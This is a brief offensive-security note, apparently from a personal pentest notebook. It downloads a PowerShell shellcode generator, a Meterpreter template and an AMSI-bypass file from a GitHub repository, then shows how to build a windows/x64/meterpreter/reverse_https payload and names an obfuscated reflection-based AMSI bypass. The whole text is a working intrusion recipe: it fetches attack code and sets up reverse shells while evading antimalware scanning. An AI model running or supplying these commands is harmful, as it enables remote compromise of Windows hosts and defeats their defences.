```bash
wget https://raw.githubusercontent.com/GooseGusevich/Code_WEB_Obsidian/refs/heads/main/Powershell_shellcode/shell.py
```
```bash
wget https://raw.githubusercontent.com/GooseGusevich/Code_WEB_Obsidian/refs/heads/main/Powershell_shellcode/met.txt
```
```bash
wget https://raw.githubusercontent.com/GooseGusevich/Code_WEB_Obsidian/refs/heads/main/Powershell_shellcode/amsi.txt
```
## Example
```bash
python3 shell.py <IP> <PORT> <PAYLOAD>
```
```bash
python3 shell.py 127.0.0.1 443 windows/x64/meterpreter/reverse_https
```

## Info
AMSI bypass via ReflectionFromAssembly with obfuscation.
```http
https://amsi.fail/
```
